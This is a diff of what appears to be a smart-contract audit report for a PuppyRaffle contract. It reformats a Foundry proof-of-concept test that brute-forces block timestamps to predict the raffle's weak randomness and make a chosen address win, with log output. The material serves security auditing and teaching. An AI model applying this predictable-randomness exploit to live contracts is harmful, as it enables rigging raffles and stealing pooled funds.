@@ -194,7 +194,7 @@ The following PoC simulates a raffle with 100 participants. The goal is to manip
     Address of expected winner: 0x000000000000000000000000000000000000001a
     Number of attempts to find the expected winner: 12
     Actual Winner: 0x000000000000000000000000000000000000001a
-    Ending balance of address 26: 80000000000000000000
+    Final balance of address 26: 80000000000000000000
 
 ```
 
@@ -203,65 +203,64 @@ The following PoC simulates a raffle with 100 participants. The goal is to manip
 
 ``` solidity 
 
-        function test100Randomness() public returns (bool, address) {
-            
-            uint256 predictWinnerIndex;
-            uint256 numberOfAttempts = 0;
-            uint256 numberOfPlayers = 100; 
+    function test100Randomness() public {
+        address expectedWinner;
+        uint256 numberOfAttempts = 0;
+        
 
-            address predictWinner;
-            address expectedWinner;
-                     
-            console.log("Starting balance of address 26: %s", address(payable(26)).balance);
-
-            // creating players
-            address[] memory players = new address[](numberOfPlayers);
-            // create 100 unique address
-            for (uint256 i; i < players.length; i++) {
-                players[i] = address(payable(i));
-            }
-            uint256 playerLength = players.length;
-
-            // entering the raffle
-            puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
-
-            // calc the end time
-            uint256 raffleEndTime = puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration();
-
-            for (uint256 i = 0; i < 1000; i++) {
-                // used to discover the number of attempts to discover the winner
-                numberOfAttempts++;
-
-                // with each iteration, the testTimestamp is incremented by 1 + i
-                uint256 testTimestamp = raffleEndTime + 1 + i;
-                // updating the current timestamp with each iteration
-                vm.warp(testTimestamp); 
-
-                // discovered timestamp is applied to the equation 
-                uint256 expectedWinnerIndex = uint256(keccak256(abi.encodePacked(address(this), testTimestamp, block.difficulty))) % playerLength;
-
-                // get the address of the expected winner 
-                expectedWinner = players[expectedWinnerIndex];
-
-                // making sure the expected winner matches the desired address to win!!!
-                if (expectedWinner == players[26]) {
-                    console.log("Malicious Timestamp: %s", testTimestamp);
-                    console.log("Expected winner index: %s", expectedWinnerIndex);
-                    console.log("Address of expected winner: %s", expectedWinner);
-                    console.log("Number of attempts to find the expected winner: %s", numberOfAttempts);
-
-                    vm.prank(address(this));
-                    puppyRaffle.selectWinner();
-
-                    address actualWinner = puppyRaffle.previousWinner();
-                    console.log("Actual Winner: %s", actualWinner);
-
-                    assertEq(actualWinner, expectedWinner, "Address 26 did not win");
-                    break; 
-                }
-            }
-            console.log("Balance of address 26: %s", address(expectedWinner).balance);
+        // creating players
+        uint256 numberOfPlayers = 100; 
+        address[] memory players = new address[](numberOfPlayers);
+        // create 100 unique address
+        for (uint256 i; i < players.length; i++) {
+            players[i] = address(payable(i));
         }
+
+        uint256 playerLength = players.length;
+
+      console.log("Starting balance of address 26: %s", address(payable(26)).balance);
+        
+        // entering the raffle
+        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
+
+        // calc the end time
+        uint256 raffleEndTime = puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration();
+
+        for (uint256 i = 0; i < 1000; i++) {
+            // used to discover the number of attempts to discover the winner
+            numberOfAttempts++;
+
+            // with each iteration, the testTimestamp is incremented by 1 + i
+            uint256 testTimestamp = raffleEndTime + 1 + i;
+            // updating the current timestamp with each iteration
+            vm.warp(testTimestamp); 
+
+            // discovered timestamp is applied to the equation 
+            uint256 expectedWinnerIndex = uint256(keccak256(abi.encodePacked(address(this), testTimestamp, block.difficulty))) % playerLength;
+
+            // get the address of the expected winner 
+            expectedWinner = players[expectedWinnerIndex];
+
+            // making sure the expected winner matches the desired address to win!!!
+            if (expectedWinner == players[26]) {
+                console.log("Malicious Timestamp: %s", testTimestamp);
+                console.log("Expected winner index: %s", expectedWinnerIndex);
+                console.log("Address of expected winner: %s", expectedWinner);
+                console.log("Number of attempts to find the expected winner: %s", numberOfAttempts);
+
+                vm.prank(address(this));
+                puppyRaffle.selectWinner();
+
+                address actualWinner = puppyRaffle.previousWinner();
+                console.log("Actual Winner: %s", actualWinner);
+
+                assertEq(actualWinner, expectedWinner, "Address 26 did not win");
+                break; 
+            }
+        }
+        console.log("Final balance of address 26: %s", address(expectedWinner).balance);
+    }
+
 
 
 ```
